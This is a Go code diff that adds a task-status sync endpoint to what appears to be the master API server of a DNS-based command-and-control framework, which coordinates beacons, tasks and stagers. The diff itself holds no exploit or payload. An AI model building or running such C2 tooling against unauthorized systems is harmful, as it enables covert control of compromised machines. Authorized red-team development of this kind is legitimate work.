@@ -1238,6 +1238,37 @@ func (api *APIServer) handleGetBeaconsForDNSServer(w http.ResponseWriter, r *htt
 	api.sendJSON(w, beacons)
 }
 
+// handleGetTaskStatusesForDNSServer returns completed/failed task statuses for DNS servers
+// This allows DNS servers to clear beacon.CurrentTask when Master completes task reassembly
+func (api *APIServer) handleGetTaskStatusesForDNSServer(w http.ResponseWriter, r *http.Request) {
+	dnsServerID := r.Header.Get("X-DNS-Server-ID")
+
+	// Get tasks with completed/failed/partial status that haven't been synced yet
+	tasks, err := api.db.GetCompletedTasksForSync(dnsServerID)
+	if err != nil {
+		api.sendError(w, http.StatusInternalServerError, "failed to retrieve task statuses")
+		return
+	}
+
+	if api.config.Debug && len(tasks) > 0 {
+		fmt.Printf("[API] Returning %d completed task status(es) to DNS server %s\n", len(tasks), dnsServerID)
+	}
+
+	// Mark these tasks as synced to avoid sending them again
+	if len(tasks) > 0 {
+		taskIDs := make([]string, len(tasks))
+		for i, task := range tasks {
+			taskIDs[i] = task["id"].(string)
+		}
+		// Mark as synced (fire and forget - don't fail the response if this errors)
+		go api.db.MarkTasksAsSynced(taskIDs)
+	}
+
+	// Return tasks array directly (not wrapped in object)
+	w.Header().Set("Content-Type", "application/json")
+	json.NewEncoder(w).Encode(tasks)
+}
+
 // handleSubmitResult processes a task result from a DNS server
 // Handles both single-chunk and multi-chunk results from distributed DNS servers
 func (api *APIServer) handleSubmitResult(w http.ResponseWriter, r *http.Request) {
@@ -1984,6 +2015,7 @@ func (api *APIServer) SetupRoutes(router *mux.Router) {
 	dnsRouter.HandleFunc("/result", api.handleSubmitResult).Methods("POST")
 	dnsRouter.HandleFunc("/progress", api.handleSubmitProgress).Methods("POST")
 	dnsRouter.HandleFunc("/tasks", api.handleGetTasksForDNSServer).Methods("GET")
+	dnsRouter.HandleFunc("/task-statuses", api.handleGetTaskStatusesForDNSServer).Methods("GET")
 	dnsRouter.HandleFunc("/beacons", api.handleGetBeaconsForDNSServer).Methods("GET")
 
 	// Stager protocol endpoints (called by DNS servers on behalf of stagers)
